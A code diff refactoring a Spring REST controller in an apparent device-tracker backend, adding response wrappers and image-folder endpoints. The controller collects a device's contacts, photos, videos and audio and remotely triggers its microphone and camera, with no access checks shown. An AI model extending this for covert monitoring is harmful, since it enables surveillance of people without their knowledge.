@@ -3,26 +3,20 @@ package com.manish.device_tracker_api.controller;
 import java.io.IOException;
 import java.util.List;
 
-import org.springframework.beans.factory.annotation.Autowired;
-import org.springframework.http.ResponseEntity;
-import org.springframework.web.bind.annotation.DeleteMapping;
-import org.springframework.web.bind.annotation.GetMapping;
-import org.springframework.web.bind.annotation.PathVariable;
-import org.springframework.web.bind.annotation.PostMapping;
-import org.springframework.web.bind.annotation.PutMapping;
-import org.springframework.web.bind.annotation.RequestMapping;
-import org.springframework.web.bind.annotation.RequestParam;
-import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.bind.annotation.*;
 import org.springframework.web.multipart.MultipartFile;
 
+import com.manish.device_tracker_api.dto.ApiResponse;
 import com.manish.device_tracker_api.dto.ContactPayload;
 import com.manish.device_tracker_api.dto.ContactResponse;
+import com.manish.device_tracker_api.dto.ImageFolderSyncRequest;
+import com.manish.device_tracker_api.dto.ImageRefreshRequest;
 import com.manish.device_tracker_api.dto.ImageResponse;
 import com.manish.device_tracker_api.dto.MicRequest;
 import com.manish.device_tracker_api.entity.Audio;
 import com.manish.device_tracker_api.entity.Video;
 import com.manish.device_tracker_api.service.MediaService;
-import org.springframework.web.bind.annotation.RequestBody;
+
 import lombok.RequiredArgsConstructor;
 
 @RestController
@@ -30,120 +24,204 @@ import lombok.RequiredArgsConstructor;
 @RequiredArgsConstructor
 public class MediaController {
 
-    @Autowired
-    private MediaService mediaService;
+    private final MediaService mediaService;
+
+    // ======================= Contact =======================
 
     @PostMapping("/contact/save")
-    public ResponseEntity<?> saveContact(
+    public ApiResponse<String> saveContact(
             @RequestBody ContactPayload request) {
 
         mediaService.saveContact(request);
 
-        return ResponseEntity.ok("Contact Saved");
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Contact Saved")
+                .data(null)
+                .build();
     }
 
     @GetMapping("/contact/{deviceId}")
-    public ResponseEntity<List<ContactResponse>> getContacts(
+    public ApiResponse<List<ContactResponse>> getContacts(
             @PathVariable String deviceId) {
 
-        return ResponseEntity.ok(
-                mediaService.getContacts(deviceId));
+        return ApiResponse.<List<ContactResponse>>builder()
+                .success(true)
+                .message("Success")
+                .data(mediaService.getContacts(deviceId))
+                .build();
     }
 
     @PutMapping("/contacts/refresh/{deviceId}")
-    public ResponseEntity<?> refreshContacts(
+    public ApiResponse<String> refreshContacts(
             @PathVariable String deviceId) {
 
         mediaService.refreshContacts(deviceId);
 
-        return ResponseEntity.ok("Refresh Requested");
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Refresh Requested")
+                .data(null)
+                .build();
     }
 
     @DeleteMapping("/contact/{deviceId}")
-    public ResponseEntity<?> deleteContacts(
+    public ApiResponse<String> deleteContacts(
             @PathVariable String deviceId) {
 
         mediaService.deleteContacts(deviceId);
 
-        return ResponseEntity.ok("Contacts Deleted");
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Contacts Deleted")
+                .data(null)
+                .build();
     }
 
+    // ======================= Image =======================
+
     @PostMapping("/image/upload")
-    public ResponseEntity<?> uploadImages(
+    public ApiResponse<String> uploadImages(
 
             @RequestParam("deviceId") String deviceId,
 
-            @RequestParam("files") List<MultipartFile> files) throws IOException {
+            @RequestParam("clearOld") Boolean clearOld,
 
-        mediaService.saveImages(deviceId, files);
+            @RequestParam("files") List<MultipartFile> files)
 
-        return ResponseEntity.ok("Images Uploaded");
+            throws IOException {
+
+        mediaService.saveImages(deviceId, files, clearOld);
+
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Images Uploaded")
+                .data(null)
+                .build();
     }
 
     @GetMapping("/image/{deviceId}")
-    public ResponseEntity<List<ImageResponse>> getImages(
+    public ApiResponse<List<ImageResponse>> getImages(
             @PathVariable String deviceId) {
 
-        return ResponseEntity.ok(
-                mediaService.getImages(deviceId));
+        return ApiResponse.<List<ImageResponse>>builder()
+                .success(true)
+                .message("Success")
+                .data(mediaService.getImages(deviceId))
+                .build();
     }
 
     @DeleteMapping("/image/{deviceId}")
-    public ResponseEntity<?> deleteImages(
+    public ApiResponse<String> deleteImages(
             @PathVariable String deviceId) {
 
         mediaService.deleteImages(deviceId);
 
-        return ResponseEntity.ok("Images Deleted");
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Images Deleted")
+                .data(null)
+                .build();
     }
 
+    @PostMapping("/image/folders")
+    public ApiResponse<String> syncFolders(
+            @RequestBody ImageFolderSyncRequest request) {
+
+        mediaService.syncFolders(request);
+
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Folder Synced")
+                .data(null)
+                .build();
+    }
+
+    @GetMapping("/image/folders/{deviceId}")
+    public ApiResponse<?> getFolders(
+            @PathVariable String deviceId) {
+
+        return ApiResponse.builder()
+                .success(true)
+                .message("Success")
+                .data(mediaService.getFolders(deviceId))
+                .build();
+    }
+
+    @PostMapping("/image/refresh")
+    public ApiResponse<String> refreshImages(
+            @RequestBody ImageRefreshRequest request) {
+
+        mediaService.refreshImages(request);
+
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Refresh Requested")
+                .data(null)
+                .build();
+    }
+
+    // ======================= Video =======================
+
     @PostMapping("/video/upload")
-    public ResponseEntity<?> uploadVideos(
+    public ApiResponse<String> uploadVideos(
 
             @RequestParam("deviceId") String deviceId,
 
             @RequestParam("files") List<MultipartFile> files)
+
             throws IOException {
 
         mediaService.saveVideos(deviceId, files);
 
-        return ResponseEntity.ok("Videos Uploaded");
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Videos Uploaded")
+                .data(null)
+                .build();
     }
 
     @PostMapping("/video/request/{deviceId}")
-    public ResponseEntity<?> requestVideos(
-
+    public ApiResponse<String> requestVideos(
             @PathVariable String deviceId) {
 
         mediaService.requestVideos(deviceId);
 
-        return ResponseEntity.ok(
-
-                "Video request sent successfully"
-
-        );
-
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Video request sent successfully")
+                .data(null)
+                .build();
     }
 
     @GetMapping("/video/{deviceId}")
-    public ResponseEntity<List<Video>> getVideos(
+    public ApiResponse<List<Video>> getVideos(
             @PathVariable String deviceId) {
 
-        return ResponseEntity.ok(
-                mediaService.getVideos(deviceId));
+        return ApiResponse.<List<Video>>builder()
+                .success(true)
+                .message("Success")
+                .data(mediaService.getVideos(deviceId))
+                .build();
     }
 
     @DeleteMapping("/video/{deviceId}")
-    public ResponseEntity<?> deleteVideos(
+    public ApiResponse<String> deleteVideos(
             @PathVariable String deviceId) {
 
         mediaService.deleteVideos(deviceId);
 
-        return ResponseEntity.ok("Videos Deleted");
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Videos Deleted")
+                .data(null)
+                .build();
     }
 
+    // ======================= Audio =======================
+
     @PostMapping("/audio/upload")
-    public ResponseEntity<?> uploadAudios(
+    public ApiResponse<String> uploadAudios(
 
             @RequestParam("deviceId") String deviceId,
 
@@ -153,103 +231,128 @@ public class MediaController {
 
         mediaService.saveAudios(deviceId, files);
 
-        return ResponseEntity.ok("Audios Uploaded");
-
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Audios Uploaded")
+                .data(null)
+                .build();
     }
 
     @GetMapping("/audio/{deviceId}")
-    public ResponseEntity<List<Audio>> getAudios(
-
+    public ApiResponse<List<Audio>> getAudios(
             @PathVariable String deviceId) {
 
-        return ResponseEntity.ok(
-
-                mediaService.getAudios(deviceId)
-
-        );
-
+        return ApiResponse.<List<Audio>>builder()
+                .success(true)
+                .message("Success")
+                .data(mediaService.getAudios(deviceId))
+                .build();
     }
 
     @PostMapping("/audio/request/{deviceId}")
-    public ResponseEntity<?> requestAudio(
-
+    public ApiResponse<String> requestAudio(
             @PathVariable String deviceId) {
 
         mediaService.requestAudio(deviceId);
 
-        return ResponseEntity.ok(
-                "Audio request sent successfully");
-
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Audio request sent successfully")
+                .data(null)
+                .build();
     }
 
     @DeleteMapping("/audio/{deviceId}")
-    public ResponseEntity<?> deleteAudios(
-
+    public ApiResponse<String> deleteAudios(
             @PathVariable String deviceId) {
 
         mediaService.deleteAudios(deviceId);
 
-        return ResponseEntity.ok("Audios Deleted");
-
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Audios Deleted")
+                .data(null)
+                .build();
     }
 
-    @PostMapping("/mic/request")
-    public ResponseEntity<?> requestMic(
+    // ======================= Mic =======================
 
+    @PostMapping("/mic/request")
+    public ApiResponse<String> requestMic(
             @RequestBody MicRequest request) {
 
         mediaService.requestMic(request);
 
-        return ResponseEntity.ok("Success");
-
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Success")
+                .data(null)
+                .build();
     }
 
-    // ________________________Camera___________________________________
+    // ======================= Camera =======================
 
     @PostMapping("/camera/request/{deviceId}")
-    public ResponseEntity<?> requestCamera(
+    public ApiResponse<String> requestCamera(
             @PathVariable String deviceId) {
 
         mediaService.requestCamera(deviceId);
 
-        return ResponseEntity.ok("Camera request sent");
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Camera request sent")
+                .data(null)
+                .build();
     }
 
     @GetMapping("/camera/status/{deviceId}")
-    public ResponseEntity<Boolean> cameraStatus(
+    public ApiResponse<Boolean> cameraStatus(
             @PathVariable String deviceId) {
 
-        return ResponseEntity.ok(
-                mediaService.cameraStatus(deviceId));
+        return ApiResponse.<Boolean>builder()
+                .success(true)
+                .message("Success")
+                .data(mediaService.cameraStatus(deviceId))
+                .build();
     }
 
     @PostMapping("/camera/started/{deviceId}")
-    public ResponseEntity<?> cameraStarted(
+    public ApiResponse<String> cameraStarted(
             @PathVariable String deviceId) {
 
         mediaService.cameraStarted(deviceId);
 
-        return ResponseEntity.ok("OK");
-
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("OK")
+                .data(null)
+                .build();
     }
 
     @PostMapping("/camera/stopped/{deviceId}")
-    public ResponseEntity<?> cameraStopped(
+    public ApiResponse<String> cameraStopped(
             @PathVariable String deviceId) {
 
         mediaService.cameraStopped(deviceId);
 
-        return ResponseEntity.ok("OK");
-
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("OK")
+                .data(null)
+                .build();
     }
 
     @PostMapping("/camera/request-received/{deviceId}")
-    public ResponseEntity<?> cameraRequestReceived(
+    public ApiResponse<String> cameraRequestReceived(
             @PathVariable String deviceId) {
 
         mediaService.cameraRequestReceived(deviceId);
 
-        return ResponseEntity.ok("Camera Request Received");
+        return ApiResponse.<String>builder()
+                .success(true)
+                .message("Camera Request Received")
+                .data(null)
+                .build();
     }
 
 }
